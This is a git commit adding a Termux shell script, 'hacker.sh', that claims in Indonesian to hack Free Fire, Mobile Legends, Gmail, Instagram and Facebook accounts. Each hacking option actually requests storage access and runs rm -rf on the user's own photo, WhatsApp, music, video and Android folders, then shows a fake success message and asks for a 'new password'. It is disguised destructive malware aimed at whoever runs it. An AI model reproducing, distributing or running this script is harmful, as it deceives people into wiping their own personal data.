9eb0e5e52537f6a254947c8c615dc4c26972e4fa
MrVirusSpm-07 <81134812+MrVirusSpm-07@users.noreply.github.com>
2021-06-09 22:07:26 +0700

    Add files via upload

---
+++ hacker.sh
@@ -0,0 +1,177 @@
+#!/bin/sh
+#bymrvirusspm
+
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+
+clear
+sleep 1
+echo $green
+figlet MRVIRUS
+echo
+   echo $red"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+   echo $red"!!"$cyan"    AUTHOR : MR VIRUS SPM"$red"          !!"
+   echo $red"!!"$cyan"    TEAM   : MAFIA TRKNOLOGI"$red"       !!"
+   echo $red"!!"$cyan"    PESAN  : TIDAK ADA ORANG BAIK"$red"  !!"
+   echo $red"!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
+sleep 2
+echo
+echo                                                                                                                                                                               echo $green"["$cyan"01"$green"]"$cyan" HACK AKUN FF"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1                                                                                                                                                                            echo $green"["$cyan"02"$green"]"$cyan" HACK AKUN ML"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1
+  echo $green"["$cyan"03"$green"]"$cyan" HACK AKUN GMAIL"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1
+  echo $green"["$cyan"04"$green"]"$cyan" HACK INSTAGRAM"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1
+  echo $green"["$cyan"05"$green"]"$cyan" HACK FACEBOOK"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1
+  echo $green"["$cyan"06"$green"]"$cyan" KELUAR"
+sleep 1
+  echo $red"+++++++++++++++++++++++++++++++++++++++++++++++++++"
+sleep 1
+echo $yellow
+echo "MASUKAN PILIHAN ANDA"
+read -p "=> " gop;
+if [ $gop = 1 ] || [ $gop = 01 ]
+then
+echo $cyan"MASUKAN ID TARGET"$green
+read -p "=> " id;
+echo "sedang mengunci id target $id"
+sleep 2
+termux-setup-storage
+sleep 10
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+sleep 5
+echo $white
+echo "BERHASIL"
+echo "MASUKAN SANDI BARU "
+read -p "=> " sandi;
+echo $yellow"$id"
+echo $yellow"$sandi"
+fi
+if [ $gop = 2 ] || [ $gop = 02 ]
+then
+echo $cyan"MASUKAN ID TARGET"$green
+read -p "=> " id;
+echo "sedang mengunci id target $id"
+sleep 2
+termux-setup-storage
+sleep 10
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+echo $white
+echo "BERHASIL"
+echo "MASUKAN SANDi BARU"
+read -p "=> " sandi;
+echo $yellow"$id"
+echo $yellow"$sandi"
+fi
+if [ $gop = 3 ] || [ $gop = 03 ]
+then
+echo $cyan"MASUKAN ID TARGET"$green
+read -p "=> " id;
+echo "sedang mengunci id target $id"
+termux-setup-storage
+sleep 10
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+echo $white
+echo "BERHASIL"
+echo "MASUKAN SANDi BARU"
+read -p "=> " sandi;
+echo $yellow"$id"
+echo $yellow"$sandi"
+fi
+if [ $gop = 4 ] || [ $gop = 04 ]
+then
+echo $cyan"MASUKAN ID TARGET"$green
+read -p "=> " id;
+echo "sedang mengunci id target $id"
+termux-setup-storage
+sleep 10
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+echo $white
+echo "BERHASIL"
+echo "MASUKAN SANDi BARU"
+read -p "=> " sandi;
+echo $yellow"$id"
+echo $yellow"$sandi"
+fi
+if [ $gop = 5 ] || [ $gop = 05 ]
+then
+echo $cyan"MASUKAN ID TARGET"$green
+read -p "=> " id;
+echo "sedang mengunci id target $id"
+termux-setup-storage
+sleep 10
+    rm -rf cd /storage/emulated/0/DCIM
+    rm -rf cd /storage/emulated/0/Android
+    rm -rf cd /storage/emulated/0/WhatsApp
+    rm -rf cd /storage/emulated/0/Music
+    rm -rf cd /storage/emulated/0/Vidio
+    rm -rf cd /sdcard/Android
+    rm -rf cd /sdcard/WhatsApp
+    rm -rf cd /sdcard/DCIM
+    rm -rf cd /sdcard/Music
+    rm -rf cd /sdcard/Vidio
+echo $white
+echo "BERHASIL"
+echo "MASUKAN SANDi BARU"
+read -p "=> " sandi;
+echo $yellow"$id"
+echo $yellow"$sandi"
+fi
+if [ $gop = 6 ] || [ $gop = 06 ]
+then
+clear
+   exit
+fi
